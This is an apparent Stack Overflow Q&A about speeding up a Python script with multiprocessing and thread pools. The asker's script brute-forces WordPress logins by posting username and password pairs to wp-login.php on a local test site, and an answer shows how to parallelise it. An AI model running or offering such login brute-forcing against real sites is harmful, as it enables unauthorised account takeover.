<div class="post-text" itemprop="text">
<p>Without multiprocessing my code brute-forced my test-site in 8 seconds (4 logins\100 passwords).
With <code>multiprocessing</code> it took 115 seconds instead.</p>
<pre><code>import requests
import multiprocessing
import itertools
from concurrent.futures import ThreadPoolExecutor

def main(user, password):
    url = 'http://192.168.1.6/wp-login.php'
    payload = {'log': user, 'pwd': password}
    r = requests.post(url, data=payload)
    if ("/wp-admin/" in r.url):
        print("[+] {}/{}".format(user, password))
    else:
        print("[-] {}/{}".format(user, password))


if __name__ == '__main__':
    users = get_usernames()
    passwords = get_passwords()
    with ThreadPoolExecutor(max_workers=4) as pool:
        for user, password in itertools.product(users, passwords):
            pool.submit(main, user, password)
</code></pre>
</div>
<div class="post-text" itemprop="text">
<p>NB: processes are the wrong tool for input/output related speedup. See <a href="https://stackoverflow.com/questions/3044580/multiprocessing-vs-threading-python">this discussion</a>.</p>
<hr/>
<p>You joined the process inside the loop, so the code is completely serial (each process completes before the next one is created). You need to move the <code>join</code>s into a separate loop.</p>
<pre><code>processes = []
for user, password in itertools.product(users, passwords):
    p = multiprocessing.Process(target=main, args=(user, password))
    processes.append(p)
    p.start()

for p in processes:
    p.join()
</code></pre>
<p>To let the <code>multiprocessing</code> module handle this for you, look into using a <a href="https://docs.python.org/3/library/multiprocessing.html#using-a-pool-of-workers" rel="nofollow noreferrer">pool</a> instead of creating the processes manually. However, as mentioned above, you probably want a thread pool, not a process pool, in which case you should look <a href="https://stackoverflow.com/questions/3044580/multiprocessing-vs-threading-python">here</a>.</p>
<hr/>
<p>As requested, an example of using a pool:</p>
<pre><code>from concurrent.futures import ThreadPoolExecutor
import itertools

def foo(a, b):
    print(a, b)

if __name__ == '__main__':
    names = ['jim', 'john', 'jill', 'jen']
    passwords = ['1', '2', '3', '4', '5', '6']

    with ThreadPoolExecutor(max_workers = 4) as pool:
        for name, password in itertools.product(names, passwords):
            pool.submit(foo, name, password)
</code></pre>
</div>
<span class="comment-copy">You probably want <code>itertools.izip</code> rather than <code>product</code>.</span>
<span class="comment-copy">Don't vandalize your posts.</span>
<span class="comment-copy">Please do not vandalize your posts. Once you've posted a question, it belongs to the Stack Overflow community at large (under the CC-by-SA license). If you would like to disassociate this post from your account, see <a href="http://meta.stackoverflow.com/q/323395/584192">What is the proper route for a disassociation request</a>?</span>
<span class="comment-copy">My PC freezes when I copy this code and run.</span>
<span class="comment-copy">@ThelazyadherentofPython Well, yes. You're probably spawning a huge number of processes. As I said, you should be using a pool with a limited number of processes or a thread pool.</span>
<span class="comment-copy">I have been through the past four days used Pool, but it's not work, because I don't know how put my user and password as one argument. I mean, p = multiprocessing.Pool(main, list), where list should be my user and password.</span>
<span class="comment-copy">@ThelazyadherentofPython use <a href="https://docs.python.org/3/library/multiprocessing.html#multiprocessing.pool.Pool.starmap" rel="nofollow noreferrer">starmap</a>.</span>
<span class="comment-copy">Can u make example using my code, because I trying and only more problems.</span>
